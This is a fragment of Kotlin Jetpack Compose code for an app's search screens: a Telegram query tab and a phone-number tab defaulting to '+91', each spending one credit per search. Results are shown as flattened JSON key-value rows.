            Tab(selected = subTab == 2, onClick = { subTab = 2 }, text = { Text("Phone") })
        }
        Spacer(Modifier.height(16.dp))
        OutlinedTextField(
            value = query,
            onValueChange = { query = it },
            label = { Text("Enter Query") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = GoldAccent,
                focusedLabelColor = GoldAccent
            )
        )
        Spacer(Modifier.height(12.dp))
        Button(
            onClick = {
                if (!canSearch) { onOutOfCredits(); return@Button }
                if (query.isBlank()) return@Button
                if (onUseCredit()) viewModel.searchTelegram(query, subTab == 1)
                else onOutOfCredits()
            },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
        ) {
            Text("SEARCH · 1 CREDIT", fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(16.dp))
        when (val s = state) {
            is UiState.Loading -> Box(Modifier.fillMaxWidth().padding(24.dp), contentAlignment = Alignment.Center) {
                CircularProgressIndicator(color = GoldAccent)
            }
            is UiState.Error -> Text(s.msg, color = ErrorRed, modifier = Modifier.padding(8.dp))
            is UiState.Success -> ResultCard(s.data)
            UiState.Idle -> {}
        }
    }
}

@Composable
fun PhoneTab(
    canSearch: Boolean,
    onUseCredit: () -> Boolean,
    onOutOfCredits: () -> Unit,
    viewModel: AppViewModel = viewModel()
) {
    var phone by remember { mutableStateOf("+91") }
    val state by viewModel.phoneState.collectAsState()

    Column(Modifier.padding(16.dp).verticalScroll(rememberScrollState())) {
        OutlinedTextField(
            value = phone,
            onValueChange = { phone = it },
            label = { Text("Phone Number (+91...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = GoldAccent,
                focusedLabelColor = GoldAccent
            )
        )
        Spacer(Modifier.height(12.dp))
        Button(
            onClick = {
                if (!canSearch) { onOutOfCredits(); return@Button }
                if (phone.isBlank()) return@Button
                if (onUseCredit()) viewModel.searchPhone(phone)
                else onOutOfCredits()
            },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
        ) {
            Text("SEARCH · 1 CREDIT", fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(16.dp))
        when (val s = state) {
            is UiState.Loading -> Box(Modifier.fillMaxWidth().padding(24.dp), contentAlignment = Alignment.Center) {
                CircularProgressIndicator(color = GoldAccent)
            }
            is UiState.Error -> Text(s.msg, color = ErrorRed, modifier = Modifier.padding(8.dp))
            is UiState.Success -> ResultCard(s.data)
            UiState.Idle -> {}
        }
    }
}

@Composable
fun ResultCard(data: JsonObject) {
    Card(
        colors = CardDefaults.cardColors(containerColor = SurfaceBg),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(Modifier.padding(16.dp)) {
            Text("RESULT", color = GoldAccent, fontWeight = FontWeight.Bold, fontSize = 11.sp)
            Spacer(Modifier.height(10.dp))
            val flat = remember(data) { flattenJson(data) }
            if (flat.isEmpty()) {
                Text("No fields in response", color = TextWhite.copy(alpha = 0.6f), fontSize = 13.sp)
            } else {
                flat.forEach { (k, v) ->
                    Row(Modifier.padding(vertical = 3.dp)) {
                        Text(
                            "$k",
                            color = GoldAccent,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            modifier = Modifier.width(130.dp)
                        )
                        Text(
                            v.ifBlank { "—" },
                            color = TextWhite,
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace,
                            modifier = Modifier.weight(1f)
                        )
                    }
                }
            }
        }
    }
}

fun flattenJson(obj: JsonObject, prefix: String = ""): List<Pair<String, String>> {
    val out = mutableListOf<Pair<String, String>>()
    for ((k, v) in obj.entrySet()) {
        val key = if (prefix.isEmpty()) k else "$prefix.$k"
        when {
            v.isJsonObject -> out += flattenJson(v.asJsonObject, key)
            v.isJsonArray -> out += key to v.asJsonArray.toString()
            v.isJsonNull -> out += key to "—"
            v.isJsonPrimitive -> out += key to v.asString
        }
    }
    return out
}
